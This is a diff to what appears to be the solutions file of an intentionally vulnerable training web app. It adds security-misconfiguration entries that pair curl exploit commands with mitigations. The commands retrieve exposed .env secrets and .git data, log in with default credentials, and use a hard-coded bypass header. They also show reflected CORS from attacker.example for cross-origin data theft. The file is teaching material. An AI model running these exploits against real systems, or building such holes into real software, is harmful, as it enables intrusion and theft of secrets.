@@ -76,6 +76,14 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [50]  OAuth — nOAuth (prompt=none + login_hint = ATO) (Ch 24)
  [51]  OAuth — ROPC grant on public client            (Ch 24)
  [52]  OAuth — predictable refresh tokens             (Ch 24)
+ [53]  Security misconfig — /.env at web root         (Ch 33, A05)
+ [54]  Security misconfig — /.git/ exposed            (Ch 33, A05)
+ [55]  Security misconfig — /internal/dashboard default creds admin:admin (Ch 33)
+ [56]  Security misconfig — verbose Server + X-Powered-By banner (Ch 33)
+ [57]  Security misconfig — backup file /static/backup/admin.js.bak (Ch 33)
+ [58]  Security misconfig — support-token bypass header (Ch 33)
+ [59]  Security misconfig — CORS reflected origin + credentials on /api (Ch 33)
+ [60]  Security misconfig — /uploads/ directory listing enabled (Ch 33)
 
 
 --------------------------------------------------------------------------------
@@ -820,6 +828,136 @@ MITIGATION
   refresh_token must be cryptographically random and at least 128 bits of
   entropy. Rotate on every use. Bind to client_id, scope and (optionally)
   device fingerprint.
+
+
+--------------------------------------------------------------------------------
+ [53] Security misconfig — /.env at web root
+--------------------------------------------------------------------------------
+SINK   routes/misconfig.js  GET /.env
+CHAPTER 33
+
+EXPLOIT
+  curl -s http://localhost:3001/.env
+  # Returns DB creds, JWT secret, AWS/Stripe/SendGrid keys, INTERNAL_ADMIN_*.
+
+MITIGATION
+  Never deploy a `.env` next to served content. If the framework or build
+  step copies it, add a deny rule in nginx/Apache: `location ~ /\\. { deny all; }`.
+  Use a secrets manager (Vault, AWS Secrets Manager, GitHub Actions secrets)
+  and inject at runtime.
+
+--------------------------------------------------------------------------------
+ [54] Security misconfig — /.git/ exposed
+--------------------------------------------------------------------------------
+SINK   routes/misconfig.js  express.static mount on /.git
+CHAPTER 33
+
+EXPLOIT
+  curl http://localhost:3001/.git/HEAD          # ref: refs/heads/main
+  curl http://localhost:3001/.git/config        # remote URL + user identity
+  curl http://localhost:3001/.git/refs/heads/main
+  # Real campaigns then run `git-dumper` to pull every object and recover
+  # the full source tree (including secrets later "rotated").
+
+MITIGATION
+  Build artefact must NOT contain `.git/`. Add to .dockerignore and to the
+  deploy bundle exclude list. Web server: `location ~ /\\.git { deny all; }`.
+
+--------------------------------------------------------------------------------
+ [55] Security misconfig — /internal/dashboard default creds admin:admin
+--------------------------------------------------------------------------------
+SINK   routes/misconfig.js  GET /internal/dashboard  (HTTP Basic Auth)
+CHAPTER 33
+
+EXPLOIT
+  curl -i http://localhost:3001/internal/dashboard            # 401 WWW-Authenticate
+  curl -u admin:admin http://localhost:3001/internal/dashboard
+  # Returns the internal ops panel with restart-db / flush-cache / debug links.
+
+MITIGATION
+  Move ops dashboards behind SSO + MFA + IP allow-list. Never accept default
+  credentials; rotate-on-first-login + complexity policy. Lock /internal/* at
+  the load balancer to corporate VPN ranges only.
+
+--------------------------------------------------------------------------------
+ [56] Security misconfig — verbose Server + X-Powered-By banner
+--------------------------------------------------------------------------------
+SINK   server.js  Server header middleware
+CHAPTER 33
+
+EXPLOIT
+  curl -I http://localhost:3001/login | grep -iE 'server|x-powered'
+  # Server: nginx/1.18.0 (Ubuntu) + Express/4.19.2
+  # X-Powered-By: Express
+  # Attacker now knows the exact stack and looks up CVEs for that version.
+
+MITIGATION
+  `app.disable('x-powered-by')`. Strip Server in nginx with `server_tokens off`.
+  Don't advertise version numbers anywhere. Patch instead.
+
+--------------------------------------------------------------------------------
+ [57] Security misconfig — backup file /static/backup/admin.js.bak
+--------------------------------------------------------------------------------
+SINK   data/exposed/admin.js.bak  +  routes/misconfig.js
+CHAPTER 33
+
+EXPLOIT
+  curl http://localhost:3001/static/backup/admin.js.bak
+  # Reveals the hard-coded X-Support-Token primitive used by [58].
+
+MITIGATION
+  Never copy backup/temp files into the deploy bundle. Block common suffixes
+  at the proxy: `.bak`, `.old`, `.orig`, `.swp`, `~`, `.tar.gz`, `.zip`.
+
+--------------------------------------------------------------------------------
+ [58] Security misconfig — support-token bypass header
+--------------------------------------------------------------------------------
+SINK   routes/admin.js  X-Support-Token middleware
+CHAPTER 33
+
+EXPLOIT
+  curl -s -o /dev/null -w '%{http_code}\\n' http://localhost:3001/admin
+  # 302 (redirect to login)
+  curl -H 'X-Support-Token: ENG-OVERRIDE-2024-ALL-ACCESS' http://localhost:3001/admin
+  # 200 — admin dashboard with no login at all.
+
+MITIGATION
+  Remove all "magic header" bypass paths. Production code should never trust
+  a static, shareable string for privilege elevation. If support tooling
+  needs elevated access, use short-lived signed tokens scoped per request
+  and audit-logged.
+
+--------------------------------------------------------------------------------
+ [59] Security misconfig — CORS reflected origin + credentials on /api
+--------------------------------------------------------------------------------
+SINK   routes/misconfig.js  corsReflect middleware on /api
+CHAPTER 33
+
+EXPLOIT
+  curl -i -H 'Origin: https://attacker.example' http://localhost:3001/api/me
+  # Access-Control-Allow-Origin: https://attacker.example
+  # Access-Control-Allow-Credentials: true
+  # A page on attacker.example can fetch('/api/me', {credentials:'include'})
+  # and read the JSON response.
+
+MITIGATION
+  Use an explicit allow-list of trusted origins. If credentials are needed,
+  Allow-Origin must be a single fixed origin, NEVER a wildcard or reflection.
+
+--------------------------------------------------------------------------------
+ [60] Security misconfig — /uploads/ directory listing enabled
+--------------------------------------------------------------------------------
+SINK   routes/misconfig.js  listingMiddleware on /uploads
+CHAPTER 33
+
+EXPLOIT
+  curl http://localhost:3001/uploads/
+  # HTML listing of every other tenant's uploaded file.
+
+MITIGATION
+  Disable autoindex on every static mount (Express does not enable it; this
+  lab opted in intentionally). For nginx, ensure `autoindex off;`. Store user
+  uploads behind a permission-checked download route, not directly served.
 
 
 ================================================================================
